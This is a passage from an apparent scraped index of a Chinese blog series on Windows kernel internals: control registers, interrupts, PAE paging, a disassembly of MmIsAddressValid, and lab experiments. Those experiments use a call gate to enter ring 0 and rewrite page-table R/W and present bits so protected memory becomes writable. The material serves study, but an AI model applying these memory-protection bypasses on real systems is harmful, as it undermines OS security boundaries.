Cr0寄存器Cr0寄存器，主要包括一些控制操作系统模式以及处理器状态的控制标志位。 这里介绍几个主要的标志位，其余位的描述可以参考Intel白皮书第三卷系统架构综述那章。 PE：Cr0下标为0的位是启用保护（Protection Enable）标志。PE=1保护模式，PE=0实地址模式，这个标志仅开启段级保护，而并没有启用分页机制。若要启用分页机制，那么PE和PG标志都要置位。 PG：当设置该位时即开启了分页机制。在开启这个标志之前必须已经或者同时开启PE标志。 PG=0且PE=0：处理器工作在实地址模式下 PG=0且PE=1：处理器工作在没有开启分页机制的保护模式下（不存在这样的操作系统） PG=1且PE=0：在PE没有开启的情况下 无法开启PG PG=1且PE=1：处理器工作在开启了分页机制的保护模式下 WP：对于Intel 80486或以上的CPU，CR0的位16是写保护（Write Proctect）标志，当设置该标志时，处理器会禁止超级用户程序（例如特权级0的程序）向用户级只读页面执行写操作。 对于Ring0的特权级程序，如果WP=0，可以读写任意用户级物理页，只要线性地址有效 对于Ring0的特权级程序，如果 WP=1 可以读取任意用户级物理页，但对于只读的物理页，则不能写 Cr2寄存器Cr2寄存器，保存导致缺页异常的线性地址。 之前在中断与异常中，简要概括了缺页异常，当CPU访问某个无效页面，会产生缺页异常，此时，CPU会将引起异常的线性地址存放在Cr2中，以便操作系统处理完缺页异常后，返回到原本执行的位置继续执行。 Cr3寄存器Cr3我们太熟悉了，在10-10-12分页是页目录表基址，在PAE分页下，则是页目录指针表基址 这里有两个属性，PWT和PCD之前在页的部分一直没有讲，在介绍之前，先来了解一个概念，叫做CPU缓存 CPU缓存 CPU缓存是位于CPU与物理内存之间的临时存储器，它的容量比内存小的多，但是交换速度远快于内存。 CPU缓存可以做的很大，从几K，几十K，几百K，甚至上M。 CPU缓存与TLB的区别： TLB：线性地址 物理地址 CPU缓存： 物理地址 内存 有了CPU缓存和TLB的概念后，就可以来讲讲PWT和PCD这俩属性了。 PWT(Page Write Through) PWT = 1时，CPU向cache写入数据时，同时向memory也写一份，使cache和memory的数据保持一致。优点是简单，缺点是每次都要访问memory，速度比较慢，即Write Through。 PWT = 0时，CPU向cache写入数据时，不将数据写入内存中，分为两种情况： Post Write：CPU更新cache数据时，把更新的数据写入到一个更新缓冲器，在合适的时候才对memory进行更新。这样可以提高cache访问速度，但是，在数据连续被更新两次以上的时候，缓冲区将不够使用，被迫同时更新memory。 Write Back：CPU更新cache时，只是把更新的cache区标记一下，并不同步更新memory。只是在cache区要被新进入的数据取代时，才更新memory。这样做的原因是考虑到很多时候cache存入的是中间结果，没有必要同步更新memory。优点是CPU执行的效率提高，缺点是实现起来技术比较复杂。 PCD(Page Cache Disable) PCD = 1时，禁止某个页写入缓存，直接写入内存。例如，做页表用的页，已经存储在TLB中了，可能不需要再缓存了。 PCD = 0时，不限制页写入缓存，可以参考上面PWT的情况。 Cr4寄存器Cr2寄存器，保存了一组启用多种架构扩展的标志位 这里简单概括一下PAE位和PSE位： PAE：置1时，是PAE分页；置0时，是10-10-12分页。之前在boot.ini中设置execute/noexecute的作用就是修改PAE位 PSE：控制PDE中PS位的开关，当PSE置1时，PS位才有效。具体如下： 控制寄存器小节除了上述介绍的，还有一个Cr8寄存器，仅仅在64位下才存在，这里就不作介绍了，其余寄存器总览如下： 参考文章1：https://blog.csdn.net/wyzxg/article/details/7254458 参考文章2：https://blog.csdn.net/q1007729991/article/details/53000410 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=33","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"中断与异常","slug":"中断与异常","date":"2020-03-23T14:37:48.000Z","updated":"2020-10-26T16:43:40.502Z","comments":true,"path":"2020/03/23/中断与异常/","link":"","permalink":"http://cata1oc.github.io/2020/03/23/%E4%B8%AD%E6%96%AD%E4%B8%8E%E5%BC%82%E5%B8%B8/","excerpt":"","text":"段和页的主要知识，差不多就告一段落了，这篇文章简单介绍一下中断与异常的相关概念，结合之前学习的IDT表，形成一个整体的框架，在后续文章中，会再详细解析中断和异常的处理过程。 中断什么是中断 中断通常是由CPU外部的输入输出设别（硬件）所触发的，供外部设备通知CPU“有事情需要处理”，因此又叫做中断请求（IRQ-Interrupt Request） 中断请求的目的是希望CPU暂时停止执行当前正在执行的程序，转去执行中断请求所对应的中断处理例程（中断处理程序在哪由IDT表决定） 80x86有两条中断请求线： 不可屏蔽中断线，称为NMI（NonMaskable Interrupt） 可屏蔽中断线，称为INTR（Interrupt Require） 不可屏蔽中断 （IDT表）中断号 NMI 说明 0x2 不可屏蔽中断 80x86中固定为0x2 说明： 当不可屏蔽中断产生时，CPU在执行完当前指令后会立即进入2号中断，执行相应中断处理程序 不可屏蔽中断不受EFLAG寄存器中IF位的影响，一旦发生，CPU必须处理 可屏蔽中断在硬件级，可屏蔽中断是由一块专门的芯片来管理的，通常称为中断控制器。它负责分配中断资源和管理各个中断源发出的中断请求。为了便于标识各个中断请求，中断控制器通常用IRQ（Interrupt Request）后面加上数字来表示不同的中断。 例如：在Windows中，时钟中断的IRQ编号为0，也就是：IRQ0 （IDT表）中断号 IRQ 说明 0x30 IRQ0 时钟中断 0x31~0x3F IRQ1~IRQ15 其它硬件设备的中断 说明： 如果自己的程序执行时不希望CPU去处理这些中断，可以用CLI指令清空EFLAG寄存器中的IF位。与CLI指令相反，STI指令可以用来设置EFLAG寄存器中的IF位 硬件中断与IDT表中的对应关系并且固定不变的，参见APIC（高级可编程中断控制器） 异常聊完了中断，来看看异常。异常通常是CPU在执行指令时检测到的某些错误，比如除0、访问无效页面等。 与中断的区别 中断来自于外部设备，是中断源（例如键盘）发起的，CPU是被动的。 异常来自于CPU本身，是CPU主动产生的。 INT N虽然被称为“软件中断”，但其本质是异常。因此不受EFLAG的IF位影响。 异常处理无论是由硬件设备触发的中断请求还是由CPU产生的异常，处理程序都在IDT表。 上图为IDT表中常见的中断向量号的相关描述，具体细节可以参考Intel白皮书第三卷（Exception And Interrupt Reference）这章 缺页异常（无时无刻不在发生）缺页异常产生： 当PDE/PTE的P=0时 当PDE/PTE的属性为只读，但程序试图写入时 一旦发生缺页异常，CPU会执行IDT表中的0xE号中断处理程序，由操作系统接管。 这里简单概括上述两种发生缺页异常的情况： 在操作系统中，物理页往往是紧缺的，若当前PTE指向的物理页的内容一段时间没有被访问，则会将这个物理页上的内容存到一个文件里，同时将这个物理页挂给有需要的PTE用，并将原PTE的P位置0。当程序再次访问这段内容时，发现P位为0，则会触发缺页异常，但是此时PTE下标为10,11的位置均为0，其余位置都是有值的，这种情况说明当前PTE指向的内容存到了文件中，并根据下标1~4指定的偏移，在文件中找到内容。这时再重新给这些内容挂上新的物理页，将P位改为1，这时访问便可正常执行。当然，缺页异常对于用户来说是透明的，用户只会觉得自己正常访问了某个内容，但实际上进行了很多操作，通过缺页异常，操作系统可以节省大量物理页。 当PDE/PTE属性为只读时，CPU不会进行处理，而是跳到E号中断交给操作系统来处理，操作系统发现程序正在尝试写一个只读的物理页，会返回一个C0000005错误。 异常小节当异常发生时，CPU会判断异常的种类，根据中断向量号，跳转到相应的异常处理程序，接着由操作系统接管并处理。 总结这篇简要介绍了中断与异常，在后续讲到中断章节时，会更加详细的分析过程原理。 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=32","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"2-9-9-12分页","slug":"2-9-9-12分页","date":"2020-03-22T06:53:29.000Z","updated":"2020-03-23T07:36:10.904Z","comments":true,"path":"2020/03/22/2-9-9-12分页/","link":"","permalink":"http://cata1oc.github.io/2020/03/22/2-9-9-12%E5%88%86%E9%A1%B5/","excerpt":"","text":"在前面的文章中主要介绍了10-10-12分页方式，在这种分页方式下，物理地址最多可达4GB。随着硬件发展，4GB的物理地址范围已经无法满足要求，于是Intel设计了一种新的分页方式：2-9-9-12分页（又称PAE）分页。下面就来了解一下这种分页方式是如何运作的吧。 PAE分页为什么是2-9-9-12PAE（Physical Address Extension，物理地址扩展）页，一定会涉及到2个结构，就是PDE和PTE。以PTE来说，它可以直接定位到某个物理页上的物理地址，在10-10-12分页下，由于PTE的大小是4字节(32位)，因此PTE能够寻址的范围仅有4GB。设想，若PTE有33位，那便可以寻址8GB；34位就能寻址16GB……以此类推。Intel考虑到对齐的因素，就干脆直接让PTE的长度达到64位了。这样一个PTE的大小就8字节，又因为一个PTT表的大小是4KB(4096字节)，因此原本一个PTT表里能装下1024个4字节的PTE，现在只能装下512个8字节的PTE了。2的9次方等于512，所以PTI的值为9。 同理，PDI的值也为9，这样2-9-9-12中还剩下最前面的2位。 设置PAE分页设置PAE分页比较简单，进入C盘打开boot.ini文件修改启动项，将execute改成noexecute即可，然后重启虚拟机即可进入PAE分页。 PDPTEPDPTE（Paga-Directory-Point-Table Entry）页目录指针表项，顾名思义，这是一个指向PDT表（在10-10-12分页下，Cr3指向PDT表的首地址）的元素，且位于PDPT表（PAE分页下Cr3指向PDPT表首地址）中。由于仅剩2位，所以PDPTE只有4个，同样PDPTE每项占8个字节，来看下这个结构。 Avail：下标9~11，共3位，这是留给操作系统使用的位，CPU本身并不使用 Base Address：下标12~35，寻址时，低12位补0，共36位（达到36位，与PTE保持一致，寻址空间达到64GB），即PDT基址 至于PCD和PWT，留到控制寄存器和TLB部分详解。 PDEPAE分页下，PDE扩展到了64位，其余属性变化不大。 PS = 1：大页，下标35-21是大页的物理地址，低21位填0，大页的大小为2MB（10-10-12的大页为4MB），按照2MB对齐。 PS = 0：下标35~12是页表（PTT）基址，低12位补0，共36位。 Avail：同PDPTE PTE与PDE一样，PAE分页下的PTE，也是扩展到了64位，其余变化不大 PTE中下标35-12是物理页基址，共24位（10-10-12分页下是下标31~12，共20位），低12位补0。 物理页基址+12位的页内偏移指向具体数据。 在了解这些结构后，来看一下PAE分页的大致模型 XD位在Intel新系列的CPU中，在下标63的地方多了一个属性位XD位（AMD中称为NX，即No Execetion） 我们知道段的属性有可读、可写和可执行，但是页的属性只有可读、可写。 当ret执行返回语句时，如果堆栈里的数据指向一个提前准备好的数据（把数据当作代码来执行，漏洞很多都是依赖这点，比如SQL注入），这个位的作用就是在硬件上实现一种保护，防止数据可执行的情况发生。 查找物理页PAE分页下查找对应的物理页和10-10-12差不多，拆分线性地址后，再根据PDPI、PDI、PTI偏移去找，由于每项均是8字节，所以在Windbg中使用dq指令进行查看。来看下面这个例子： 变量a的线性地址为：0x12ff7c。按照2-9-9-12进行拆分后得到0-0-12f-f7c。接着通过Cr3一步步查找，具体如下： 变量a的存的值为0x123，通过拆分线性地址，成功在找到变量a对应的物理地址。 0地址挂物理页在学习10-10-12分页时，通过0地址挂物理页的实验，加深对物理页的理解，这里我们通过这个实验进一步熟悉PAE分页。 先运行程序，发现访问违例，运行失败 查看0地址对应的物理页，发现物理页是空的。 然后查看局部变量a对应的物理页，并将a对应的物理页挂到0的位置（注意，挂物理页时，用两次!ed指令而不是!eq指令） 接着运行程序发现可以正确的打印出0地址上的内容 PAE分页下PDT/PTT的基址新增加的结构，PDPTE，并没有R/W位，US位等属性，真正决定物理页属性的还是PDE和PTE。相比10-10-12分页可以通过PDT/PTT基址修改物理页属性，在PAE分页下同样可以做到，这部分我们来研究下PAE分页下PDT和PTT的基址。 逆向分析MmIsAddressValid在前一篇文章中我们分析了10-10-12分页下的MmIsAddressValid函数，它在找到PDE/PTE后会判断下标为0(P位)和下标为7(PDE对应PS位，PTE对应PAT位)的位置的值，进行一些处理工作。而这个函数找到PDE/PTE的过程就使用了PDT/PTT的基址。这次通过分析PAE分页下的MmIsAddressValid函数，来找到PAE分页下PDT/PTT基址。 先分析查找PDE的部分 Code12345678910111213141580511987 8b4d08 mov ecx,dword ptr [ebp+8] //获取参数8051198a 56 push esi 8051198b 8bc1 mov eax,ecx8051198d c1e812 shr eax,12h //右移18位80511990 bef83f0000 mov esi,3FF8h 80511995 23c6 and eax,esi //进行与运算，余下11位有效位80511997 2d0000a03f sub eax,3FA00000h //相当于add eax, 0xC06000008051199c 8b10 mov edx,dword ptr [eax] //取PDE低四字节8051199e 8b4004 mov eax,dword ptr [eax+4] //取PDE高四字节805119a1 8945fc mov dword ptr [ebp-4],eax //高四字节保存到局部变量805119a4 8bc2 mov eax,edx805119a6 57 push edi //保存edi原本的值805119a7 83e001 and eax,1 //保留P位的值805119aa 33ff xor edi,edi805119ac 0bc7 or eax,edi 右移18位后，进行了一次与运算，保留的位相当于PDPI x 4KB + PDI x 8（看不明白的可以参考这篇） sub eax, 0x3FA00000和add eax, 0xC0600000，因此可以推测，PAE分页下PDT的基址为0xC0600000 接着分析查找PTE的部分 Code123456789101112805119c3 c1e909 shr ecx,9 //右移9位805119c6 81e1f8ff7f00 and ecx,7FFFF8h //进行与运算，余下20位有效位805119cc 8b81040000c0 mov eax,dword ptr [ecx-3FFFFFFCh] //相当于mov eax, [ecx+0xC0000004]805119d2 81e900000040 sub ecx,40000000h //相当于add ecx, 0xC0000000805119d8 8b11 mov edx,dword ptr [ecx] //取PTE低四字节805119da 8945fc mov dword ptr [ebp-4],eax //将PTE高四字节保存至局部变量805119dd 53 push ebx //保存ebx原本的值805119de 8bc2 mov eax,edx 805119e0 33db xor ebx,ebx 805119e2 83e001 and eax,1 //保留P位的值805119e5 0bc3 or eax,ebx805119e7 5b pop ebx 重点还是在与运算这，右移9位后跟0x7FFFF8进行与运算，相当于PDPI x 2MB + PDI x 4KB + PTI x 8 sub ecx，0x40000000相当于add ecx, 0xC0000000，可以推测，PAE分页下PTT的基址仍然为0xC0000000 公式总结根据MmIsAddressValid函数，可以得到PAE分页下PDT和PTT的基址分别为0xC0600000和0xC0000000。 我们可以采纳MmIsAddressValid的方法总结出找到任意一个PDE /PTE的公式： 利用MmIsAddressValid内的手法 c12pPDE = (int*)(0xc0600000 + ((addr >> 18) & 0x3ff8))pPTE = (int*)(0xc0000000 + ((addr >> 9) & 0x7ffff8)) 通过拆分线性地址 c12pPDE = (int*)(0xc0600000 + (PDPTI","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"逆向分析MmIsAddressValid(10-10-12)","slug":"逆向分析MmIsAddressValid","date":"2020-03-21T03:07:40.000Z","updated":"2020-03-21T08:36:14.300Z","comments":true,"path":"2020/03/21/逆向分析MmIsAddressValid/","link":"","permalink":"http://cata1oc.github.io/2020/03/21/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90MmIsAddressValid/","excerpt":"","text":"在对页表基址，页目录表基址熟练掌握后，今天来看逆向分析一个函数：MmIsAddressValid。这是一个系统函数，可以在ntoskrnl.exe的导出函数中找到它，也可以在Windbg中输入指令 Code1kd> u MmIsAddressValid 查看。 为什么要分析这个函数呢？因为即使是系统函数，也是无法直接使用物理页的，想要去访问PDE和PTE也就一定要通过基址来访问，而今天要分析的MmIsAddressValid函数，就利用了这么一个原理，相比前一篇的基址小实验，这里对于线性地址拆分的过程更为巧妙，让我们一起来看看吧！ 获取PDE属性 首先观察函数主体部分，发现代码并不长，但是有很多跳转，具体跳转内容就不作分析了，主要是分析函数主体： Code1234567891011121314804e4661 8bff mov edi,edi //hotpatch804e4663 55 push ebp804e4664 8bec mov ebp,esp804e4666 8b4d08 mov ecx,dword ptr [ebp+8] //取第一个参数（线性地址）804e4669 8bc1 mov eax,ecx //赋值到中间变量，方便运算804e466b c1e814 shr eax,14h //逻辑右移20位804e466e bafc0f0000 mov edx,0FFCh 804e4673 23c2 and eax,edx //和操作数进行与运算，同时清空最后2位；相当于做了一个乘4的运算，既左移2位804e4675 2d0000d03f sub eax,3FD00000h //进行减法运算，相当于eax+0xC0300000804e467a 8b00 mov eax,dword ptr [eax] //取PDE的值804e467c a801 test al,1 //判断PDE属性P位是否为1804e467e 0f84d2f10000 je nt!MmIsAddressValid+0x4f (804f3856)804e4684 84c0 test al,al //判断下标为7的位(PS位)值是否为1804e4686 7824 js nt!MmIsAddressValid+0x53 (804e46ac) 巧妙的与运算： 首先将线性地址逻辑右移20位，此时还余下12位 将这12位和操作数0xFFC做一个与运算，0xFFC换算成2进制就是1111 1111 1100。因此做完与运算后，刚刚经过第一步操作还剩下12位的数的低2位，置0了。熟悉移位运算的朋友们知道，这个12位的数，相当于1个10位的数逻辑左移2位得到，换句话说就是将这个10位的数乘4。而这个10位，就是PDI，因此这步操作完了以后，相当于我们获得了PDI*4的值。 接下来，与0x3FD00000做减法运算，作用相当于加上0xC0300000，两种方法的结果是一样的。因此，我们得到了0xC0300000 + PDI*4的值，而这个值，恰恰就是我们要找的PDE，接着只需要取出里面的值，就可以获取PDE的属性了 后续跳转再获取PDE的属性后，会遇到两个跳转，简单的概括下： 首先会判断PDE下标为0的位置的值，也就是P位，当P位为0时，说明物理页无效，会跳转到一个相应的处理函数，这里就不再跟进分析 若物理页P位为1，就会来到第二个跳转，这里test al, al指令会修改标志寄存器，当al的最高位，也就是下标为7的位置值为1时，会被认为是负数，此时会修改EFLAG寄存器的SF位。这时，在第二个跳转的位置，js判断的就是SF的值是否为1，若为1，也就是al下标为7的位置值为1，这是对应的PDE属性PS位，说明这是一个4MB的大页，进而会跳转执行相应的处理函数。 获取PTE属性Code123456789101112804e4688 c1e90a shr ecx,0Ah //逻辑右移10位804e468b 81e1fcff3f00 and ecx,3FFFFCh //和操作数进行与运算，同时清空最后2位，相当于PDI左移12位+PTI左移2位804e4691 81e900000040 sub ecx,40000000h //进行减法运算，相当于eax+0xC0000000804e4697 8bc1 mov eax,ecx804e4699 8b08 mov ecx,dword ptr [eax] //获取PTE属性804e469b f6c101 test cl,1 //判断P位的值是否为0804e469e 0f84b2f10000 je nt!MmIsAddressValid+0x4f (804f3856)804e46a4 84c9 test cl,cl //判断PAT是值是否为1804e46a6 0f88b6de0300 js nt!MmIsAddressValid+0x3f (80522562)804e46ac b001 mov al,1804e46ae 5d pop ebp804e46af c20400 ret 4 巧妙的与运算Code1and ecx, 3FFFFCh 假设线性地址右移10位后的值为 0000 0000 00aa aaaa aaaa bbbb bbbb bbxx（a, b的值为0或者1，这里只是为了区分PDI和PTI） 然后我们来拆分0x3FFFFC的值：0000 0000 0011 1111 1111 1111 1111 1100 将两者进行与运算后得到结果为 0000 0000 00aa aaaa aaaa bbbb bbbb bb00 我们知道，aa aaaa aaaa应为PDI，而bb bbbb bbbb应为PTI，因此可以把得到的结果看作是这样的一个运算：$$aa aaaa aaaa","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"},{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"}]},{"title":"基址小实验（10-10-12）","slug":"基址小实验","date":"2020-03-20T15:14:53.000Z","updated":"2020-03-22T16:36:37.983Z","comments":true,"path":"2020/03/20/基址小实验/","link":"","permalink":"http://cata1oc.github.io/2020/03/20/%E5%9F%BA%E5%9D%80%E5%B0%8F%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"在学习完页目录表基址，页表基址后，我们知道通过C0300000和C0000000这两个地址，可以访问相应的PDE和PTE，今天就来实践一下。 之前在介绍PDE/PTE属性R/W位时有过一个实验，是对位于常量区的内容进行修改，当时通过Windbg修改了所在PDE/PTE的R/W位。这次实验，我们利用页目录表/页表基址来进行修改。 测试原始代码 首先测试原始代码，发现直接修改常量区的字符串，是会失败的 提权进入0环提权这里还是会用到Windbg，根据调用函数的地址，填入段选择子，并通过调用门进行提权（就当复习调用门知识了） 修改R/W位提权进入0环后（为啥要提权呢？因为C0300000/C0000000都属于高2G的线性地址，3环没法直接访问），就到了我们最关键的步骤了，修改R/W位。 c123456temp = *(int*)0xC0300004;temp = temp|0x2;*(int*)0xC0300004 = temp;temp = *(int*)0xC000108C;temp = temp|0x2;*(int*)0xC000108C = temp; 在这之前声明了一个中间变量temp（int类型）。 具体步骤： 打印出字符串所在常量区的地址0x423fb0，进行拆分：10-10-12 -> 0x1-0x23-0xfb0 PDI = 0x1，带入公式：PDE = C0300000 + 0x1 x 4 PTI = 0x23，带入公式：PTE = C0000000 + 0x1 x 1000 + 0x23 x 4 分别取PDE和PTE处的值，并和0x2进行或运算（将R/W位置1） 这样就完成了对R/W位的修改，在接下来再次对常量区的值进行修改操作时，便可以成功。 完整代码c123456789101112131415161718192021222324252627282930313233343536373839#include \"stdafx.h\"int temp;__declspec(naked) void ModifyRW() { __asm { pushad pushfd } temp = *(int*)0xC0300004; temp = temp|0x2; *(int*)0xC0300004 = temp; temp = *(int*)0xC000108C; temp = temp|0x2; *(int*)0xC000108C = temp; __asm { popfd popad retf }}int main(int argc, char* argv[]){ char* str = \"hello\"; char buffer[6] = {0, 0, 0, 0, 0x4B, 0}; printf(\"addr: %x, str: %s\", str, str); getchar(); _asm { call fword ptr buffer } *str = 'a'; printf(\"str: %s\", str); getchar(); return 0;}","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"页目录表、页表基址","slug":"页目录表、页表基址","date":"2020-03-20T07:11:51.000Z","updated":"2020-03-20T14:22:35.004Z","comments":true,"path":"2020/03/20/页目录表、页表基址/","link":"","permalink":"http://cata1oc.github.io/2020/03/20/%E9%A1%B5%E7%9B%AE%E5%BD%95%E8%A1%A8%E3%80%81%E9%A1%B5%E8%A1%A8%E5%9F%BA%E5%9D%80/","excerpt":"","text":"考虑这样一个问题，我们现在可以通过在Windbg里找到线性地址所在的物理页，通过修改物理页的属性，就可以实现一些原本受限的功能。例如将常量区对应的物理页R/W属性修改为1，便可以修改位于常量区的元素。 但是，以上操作都是基于Windbg在双击调试的环境中实现的，那么一旦脱离了调试器，该如何通过代码来实现对物理页属性的修改呢？这就需要借助于页目录表基址和页表基址了。 页目录表基址结论：C0300000就是页目录表基址，接下来我们来验证这个结论。 C0300000拆分C0300000： 1100 0000 0011 0000 0000 0000 0000 0000 每部分位数 二进制 十六进制 10 11 0000 0000 300 10 11 0000 0000 300 12 0000 0000 0000 0 Cr3这里以记事本(notepad.exe)为例，来验证一下，C0300000就是页目录表基址，首先查看记事本对应的Cr3指向的物理地址。 我们知道，Cr3指向的是PDT的首地址，这里可以看到4个PDE有值。 查看C0300000物理页接下来的步骤就是比较熟悉的，根据拆分后的线性地址，寻找物理页的过程了。但是这一次，要慢点看。 这一步很容易理解，Cr3.base + 300*4，通过Cr3和线性地址的前10位，我们找到了PDE的值：7ea49063 什么？又重复了一遍？实际上不是，由于PDE的值为7ea49063，后12位是属性位，因此，7ea49000是我们要找的PTT的首地址，然后通过PTT.base + 300*4，就得到了PTE的值：7ea49063。 有了PTE的值，加上最后12位的偏移（此处为0），就可以找到物理页。 得到结果后，是不是很惊讶？C0300000这个线性地址对应的物理页上的物理地址，竟然和Cr3指向的物理地址完全一样！也就是说，以后不需要Cr3，只需在当前程序内，通过C0300000这个线性地址就可以得到当前程序PDT的首地址了 如何利用是啊，C0300000这个地址有啥用呢？当然有用，而且非常有用。回到文章开头的问题，我们该如何在不使用Windbg的情况下，修改物理页的属性呢？ 我们知道，想要修改物理页的属性，需要先修改物理页对应的PDE和PTE，那要如何找到PDE和PTE呢，由于在编写代码时，用到的都是线性地址，而C0300000这个线性地址刚好就可以找到PDT的首地址，这样我们拆分想要修改的物理页属性的线性地址，将前10位加上C0300000即可找到对应的PDE。 既然PDE找到了，那不就有了PTT的首地址，这样PTE不也就可以找到了吗？并不是这样，尽管找到了PDE，但是由于PDE里面存着的是物理地址，如果直接访问PDE里面存的那个地址，在代码中会转变为一个线性地址，因此并不能通过PDE获取PTT的首地址，也就不能获取到PTE了，想要找到PTE，还得需要用到另外一个基地址，就是页表基址。 页表基址还是直接上结论，页表基址：C0000000 接下来我们来验证。 C0000000拆分C0000000： 1100 0000 0000 0000 0000 0000 0000 0000 每部分位数 二进制 十六进制 10 11 0000 0000 300 10 00 0000 0000 0 12 0000 0000 0000 0 Cr3这里还是以记事本(notepad.exe)为例： 我们查看Cr3指向的物理地址，当前共有4个PDE的有值的，而PDE的值，就是PTT的首地址，以第一个PDE（36c24067）为例，其中PTT的首地址为36c24000。 查看C0000000物理页步骤和之前一样，就直接看结果好了。 发现，C0000000这个线性地址所对应的物理页，刚好是36c24000，也就是第一个PDE对应的PTT的首地址。由此可以进一步推断，C0001000则是第二个PDE对应的PTT的首地址，以此类推。 再看10-10-12分页现在再来看10-10-12分页时，看法就会有所不一样了。 实际上页表（PTT）被映射到了从0xC0000000到0xC03FFFFF的4M地址空间 在这1024个表中有一张特殊的表：页目录表（PDT） 页目录表（PDT）被映射到了0xC030000开始处的4KB大小的地址空间 总结有了0xC0300000和0xC0000000能做什么？掌握了这两个地址，就掌握了一个进程所有的物理内存读写权限。 公式总结： 什么是PDI和PTI？ 将32位线性地址拆分位10(PDI)-10(PTI)-12 访问页目录表(PDT)的公式：0xC0300000 + PDI x 4 访问页表(PTT)的公式：0xC0000000 + PDI x 1000 + PTI x 4（不用*号因为会被转义） 其它关于页的细节 高2G有一些大页，即4MB页 两个进程低2G几乎不同，高2G几乎相同 一个进程低2G的内存空间，前64K与后64K是没有使用的（线性地址0 - 00010000 与 7FFF0000 - 7FFFFFFFF） 谁填充了这些表呢进程本身可以通过0xC0300000和0xC0000000访问修改任意物理页，那么是谁为我们填充0xC0300000和0xC0000000的PDE与PTE呢？ 进程的创建过程：当创建B进程时，先在A进程中将B进程所有信息全部构建好，然后切换Cr3即可。也就是说，最开始的这张表是由A进程填充的。","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"PDE_PTE属性（部分）","slug":"PDE-PTE属性","date":"2020-03-19T12:37:33.000Z","updated":"2020-03-19T15:51:12.795Z","comments":true,"path":"2020/03/19/PDE-PTE属性/","link":"","permalink":"http://cata1oc.github.io/2020/03/19/PDE-PTE%E5%B1%9E%E6%80%A7/","excerpt":"","text":"上一篇文章中了解了PDE和PTE，这一篇就来了解一下PDE和PTE的属性。 物理页的属性 一上来看这张图，肯定是一脸懵逼的。先从行开始看，第一行是关于CR3寄存器的，这部分留到控制寄存器的章节再分析。接下来三行是不同类型PDE的，最后两行是PTE的。其中PDE和PTE有很多属性是重合的。而物理页的属性，就是有PDE和PTE共同决定的。计算方法是将相同属性位的值进行与运算。 物理页的属性 = PDE属性 & PTE属性 P位 首先来看P（Present）位：存在位。PDE与PTE的P位均位1时，物理页有效；其余情况，物理页不存在。这也解释了为什么PDE的第三行和PTE的第二行可以直接忽略。 在上一篇文章中，有一个关于0地址赋值的实验。0地址之所以不能赋值是因为它的PTE的P位为0，在我们修改了PTE的P位，并给它挂上一个物理页后，0地址遍可以赋值了。 R/W位 R/W = 0 只读 R/W = 1 可读可写 R/W很好理解，控制写的权限呗，这个位有何用呢？来看一个小实验。 c123456789101112131415#include \"stdafx.h\"int main(int argc, char* argv[]){ char* str = \"hello\"; printf(\"%x\", str); getchar(); *str = 'a'; printf(\"%s\", str); getchar(); return 0;} 来看这个代码，很明显，执行会是失败的，因为用char*定义的字符串，是会存储在常量区，而不是堆栈中了，又因为常量区的值是不允许修改的，因此 c1*str = 'a'; 这条语句会执行失败并报错。 那为什么常量区的内容就不可修改呢？其实，说白了，就是常量区挂着的物理页的R/W属性为0，因此只能读，不可写，既然知道了原因，我们只要修改了常量区所在物理页的属性，将R/W位置1即可。 通过printf语句先打印出所在常量区的线性地址，接着拆分跟进PDE和PTE中（具体步骤省略） 可以发现，PTE的R/W位值为0，因此将其修改为1写入，随后运行程序发现，可以成功修改字符串首地址出的字符！ P/S位 P/S（PageSize）位，只对PDE有意义，位于PDE的第7位。 PS = 1 PDE直接指向物理页，无PTE，低22位为页内偏移。线性地址只能拆成两段（10-22）：页的大小为2的22次方，也就是4MB，俗称“大页”，大页比较少，一般出现在高2G中 PS = 0 就是我们比较熟悉的10-10-12分页，页的大小为4KB U/S位 U/S（User/System）位，位于PDE/PTE的第2位。 U/S = 0：特权用户 U/S = 1：普通用户 三环程序是不能读写高2G内存的，原因在于高2G内存对应的物理页U/S位被置0了，也就是说只有特权用户才能读写高2G的内存。所以，当普通用户想要读取高2G内存时，就可以把U/S置1，这样就可以访问高2G内存了。 当然，理论如此，不过除了U/S位外，影响高2G内存读写的还有PCD位和PWT位，这部分内容也要到控制寄存器部分才能讲，所以第二种3环程序读写高2G实验（第一种是通过门提权），就要放到后面实现了，这里只要先记住，U/S位是影响访问读写权限的。 与R/W的区别这里需要注意一下U/S位与R/W位的区别，U/S位的读写控制是根据用户的级别，而R/W位的控制是直接控制读写，不管你是不是特权用户。 A位 A（Accessed）位于PDE/PTE的第5位：表示该物理页是否被访问（读或者写）过，访问过置1，即使只访问一个字节也会导致PDE，PTE置1。 D位 D（Dirty），脏位，是否被写过。0表示没有被写过，1表示被写过 